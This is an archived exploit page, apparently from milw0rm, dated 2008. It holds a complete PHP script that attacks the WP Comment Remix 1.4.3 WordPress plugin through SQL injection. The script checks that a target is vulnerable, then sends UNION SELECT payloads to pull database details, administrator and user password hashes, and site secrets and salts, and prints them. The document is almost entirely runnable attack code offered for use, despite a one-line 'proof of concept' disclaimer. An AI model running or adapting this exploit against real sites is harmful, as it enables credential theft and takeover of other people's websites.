<html><head><title>WP Comment Remix 1.4.3 Remote SQL Injection Exploit</title></head><pre>&lt;?php
	/**
	 * WP Comment Remix 1.4.3 SQL Injection
	 * Proof of Concept
	 * By g30rg3_x &lt;g30rg3x_at_chxsecurity_dot_org&gt;
	 *
	 * Advisory:
	 * http://chxsecurity.org/advisories/adv-3-full.txt
	 *
	 * PoC Mirror:
	 * http://chxsecurity.org/proof-of-concepts/wp-comment-remix-143.zip
	 *
	 * Attention:
	 * This is a Proof-of-Concept it was never intended to be fully functional
	 *
	 * Notes:
	 * Uses cURL
	 */

	// Script Header
	function head() {
		print &quot;\n WP Comment Remix 1.4.3 SQL Injection&quot;;
		print &quot;\n By g30rg3_x &lt;g30rg3x_at_chxsecurity_dot_org&gt;&quot;;
		print &quot;\n ------------------------------------------------&quot;;
		print &quot;\n This is a Proof-of-Concept it was never intended to be fully functional\n&quot;;
	}

	// Usage Information
	function usage() {
		global $argv;
		head();
		print &quot;\n Usage: php {$argv[0]} &lt;host&gt; &lt;path&gt; &lt;information&gt; &lt;table-prefix&gt;\n&quot;;
		print &quot;\n  &lt;host&gt;: Hostname or IP Address&quot;;
		print &quot;\n  &lt;path&gt;: Path to WordPress (Defaults to: /)&quot;;
		print &quot;\n  &lt;information&gt;: Information to Extract (Defaults to: relevant)&quot;;
		print &quot;\n    dbinfo = Extract MySQL Current User, Database and Version&quot;;
		print &quot;\n    admins = Extract Only Admins (users with level 10)&quot;;
		print &quot;\n    users = Extract All Users (includes admins)&quot;;
		print &quot;\n    options = Extract Relevant Options like active_plugins, secret, ...&quot;;
		print &quot;\n    alloptions = Extrac All Options (Huge data would be directly printed out!)&quot;;
		print &quot;\n    relevant = dbinfo + admins + options&quot;;
		print &quot;\n    all = dbinfo + users + alloptions&quot;;
		print &quot;\n  &lt;table-prefix&gt;: WordPress Tables Prefix (Defaults to: wp_)\n&quot;;
		print &quot;\n Examples:&quot;;
		print &quot;\n  php {$argv[0]} foo.bar&quot;;
		print &quot;\n  php {$argv[0]} foo.bar /wordpress/&quot;;
		print &quot;\n  php {$argv[0]} foo.bar /wordpress/ all foo_&quot;;
		print &quot;\n&quot;;
		exit();
	}

	// cURL HTTP GET
	function GET($url) {
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_HEADER, true);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Connection: Close'));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_USERAGENT, 'WP-Comment-Remix 1.4.3 SQL Injection Proof-of-Concept');
		$result = curl_exec($ch);
		curl_close($ch);

		if ( preg_match('%HTTP/[0-9.x]+ 200 OK%', $result) )
			return $result;
		else
			return false;
	}

	// Obtain Database Information
	function obtainDBInfo() {
		global $prefix, $url;
		$injection = '/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,CONCAT(0x757365727B,user(),0x7D44427B,database(),0x7D76657273696F6E7B,version(),0x7D),10,11,12,13,14,15--';
		$result = GET($url . $injection);
		preg_match_all('/user\{(?P&lt;user&gt;.+)\}DB\{(?P&lt;DB&gt;.+)\}version\{(?P&lt;version&gt;.+)\}/', $result, $captured, PREG_PATTERN_ORDER);
		$db['user'] = $captured['user'][0];
		$db['name'] = $captured['DB'][0];
		$db['version'] = $captured['version'][0];
		return $db;
	}

	// Obtain WordPress Users Information
	function obtainUsersInfo($all = false) {
		global $prefix, $url;
		$injection = &quot;/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,CONCAT(0x757365727B,{$prefix}users.user_login,0x7D706173737B,{$prefix}users.user_pass,0x7D),10,11,12,13,14,15/**/FROM/**/{$prefix}users&quot; . ( $all ? '' : &quot;,{$prefix}usermeta/**/WHERE/**/{$prefix}users.ID={$prefix}usermeta.user_id/**/AND/**/{$prefix}usermeta.meta_key/**/REGEXP/**/0x757365725F6C6576656C/**/AND/**/{$prefix}usermeta.meta_value=10&quot; ) . '--';
		$result = GET($url . $injection);
		preg_match_all('/user\{(?P&lt;user&gt;.+)\}pass\{(?P&lt;pass&gt;.+)\}/', $result, $captured, PREG_PATTERN_ORDER);
		for( $i = 0; $i &lt; count($captured['user']); $i++ )
			$users[$captured['user'][$i]] = $captured['pass'][$i];
		return $users;
	}

	// Obtain WordPress Options Information
	function obtainOptionsInfo($all = false) {
		global $prefix, $url;
		$injection = &quot;/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,CONCAT(option_name,0x7B7C,option_value,0x7C7D),10,11,12,13,14,15/**/FROM/**/{$prefix}options&quot; . ( $all ? '' : '/**/WHERE/**/option_name/**/REGEXP/**/0x7369746575726C7C6C6F67696E7C757365727C706173737C617574687C7365637265747C73616C747C6163746976655F706C7567696E737C73656564' ) . '--';
		$result = GET($url . $injection);
		preg_match_all('%&lt;p&gt;(?P&lt;name&gt;.+)\{\|(?P&lt;value&gt;.+)\|\}&lt;/p&gt;%', $result, $captured, PREG_PATTERN_ORDER);
		for( $i = 0; $i &lt; count($captured['name']); $i++ )
			$options[$captured['name'][$i]] = $captured['value'][$i];
		return $options;
	}

	// Set no time limit (only if safe mode is off)
	if ( !ini_get('safe_mode') )
		set_time_limit(0);

	// Print usage if there is no host
	if ( !isset($argv[1]) )
		usage();

	// Header, Arguments and Generate URL
	head();
	$host = $argv[1];
	$path = isset($argv[2]) ? $argv[2] : '/';
	$info = isset($argv[3]) ? $argv[3] : 'relevant';
	$prefix = isset($argv[4]) ? $argv[4] : 'wp_';
	$url = 'http://' . $host . $path . 'wp-content/plugins/wp-comment-remix/ajax_comments.php?p=0';

	// Check if we can reach &quot;ajax_comments.php&quot;
	print &quot;\n Does ajax_comments.php exist? ... &quot;;
	$result = GET($url);
	if ( !$result ) {
		print &quot;No&quot;;
		print &quot;\n -----------------------------------------------------------&quot;;
		print &quot;\n Seems that the site does not have WP Comment Remix installed&quot;;
		print &quot;\n OR the path you proportionate is incorrect.&quot;;
		print &quot;\n Please review your arguments and try again.\n&quot;;
		exit();
	}
	print 'Yes';

	// Check if is it possible to inject...
	// ToDo: Some WordPress installations return more than 15 columns (this is caused by some plugins that alter
	// the comments table structure and don't revert back this change) so this injection may fail A LOT in a non-default
	// enviroment (ie. sites with many plugins), so if you REALLY want this PoC to be more &quot;functional&quot; then improve
	// this part of the PoC; it was never my intention to deliver a &quot;fully functional&quot; Proof-of-Concept.
	print &quot;\n Can we Inject SQL Code? ... &quot;;
	$result = GET($url . '/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--');
	if ( preg_match('/There are no comments for this post/', $result) ) {
		print &quot;No&quot;;
		print &quot;\n --------------------------------------&quot;;
		print &quot;\n Seems that the host is already patched.\n&quot;;
		exit();
	}
	print 'Yes';

	// Check table prefix but don't check if the user selected to obtain database information.
	if ( $info != 'dbinfo') {
		print &quot;\n Is \&quot;{$prefix}\&quot; the table prefix? ... &quot;;
		$result = GET($url . &quot;/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15/**/FROM/**/{$prefix}users--&quot;);
		if ( preg_match('/There are no comments for this post/', $result) ) {
			print &quot;No&quot;;
			print &quot;\n ------------------------------------------------&quot;;
			print &quot;\n Seems that the table prefix \&quot;{$prefix}\&quot; is incorrect.&quot;;
			print &quot;\n But this time we are not exiting, cause we can still extract&quot;;
			print &quot;\n the database information, so m just going to change your choice&quot;;
			print &quot;\n to dbinfo so you can still get that valuable information.&quot;;
			print &quot;\n ------------------------------------------------\n&quot;;
			$info = 'dbinfo';
		} else {
			print 'Yes';
		}
	}

	// Now is time to inject
	print &quot;\n\n Seems that everything is fine so now it's super fun time :P...&quot;;
	switch($info) {
		case 'all':
			$db = obtainDBInfo();
			$users = obtainUsersInfo(true);
			$options = obtainOptionsInfo(true);
			break;
		case 'relevant':
			$db = obtainDBInfo();
			$users = obtainUsersInfo();
			$options = obtainOptionsInfo();
			break;
		case 'dbinfo':
			$db = obtainDBInfo();
			break;
		case 'admins':
			$users = obtainUsersInfo();
			break;
		case 'users':
			$users = obtainUsersInfo(true);
			break;
		case 'options':
			$options = obtainOptionsInfo();
			break;
		case 'alloptions':
			$options = obtainOptionsInfo(true);
			break;
	}

	/* It's Show Time */

	// Database Information
	if ( !empty($db) ) {
		print &quot;\n\n Database Information&quot;;
		print &quot;\n ---------------------&quot;;
		print &quot;\n MySQL User: {$db['user']}&quot;;
		print &quot;\n MySQL Version: {$db['version']}&quot;;
		print &quot;\n MySQL Database Name: {$db['name']}&quot;;
	}

	// Users Information
	if ( !empty($users) ) {
		print &quot;\n\n Users&quot;;
		print &quot;\n ---------&quot;;
		foreach( (array) $users as $user =&gt; $pass ) {
			print &quot;\n Username: {$user}&quot;;
			print &quot;\n Password: {$pass}  &quot; . ( strlen($pass) &lt;= 32 ? '(MD5)' : '(Passhash)' );
			print &quot;\n ---------&quot;;
		}
	}

	// Options Information
	if ( !empty($options) ) {
		print &quot;\n\n Options&quot;;
		print &quot;\n ---------&quot;;
		foreach( (array) $options as $name =&gt; $value ) {
			print &quot;\n Name: {$name}&quot;;
			print &quot;\n Value: {$value}&quot;;
			print &quot;\n ---------&quot;;
		}
	}

	// Good Bye =)
	print &quot;\n\n Have Fun! =)\n&quot;;
?&gt;

# milw0rm.com [2008-10-14]</pre></html>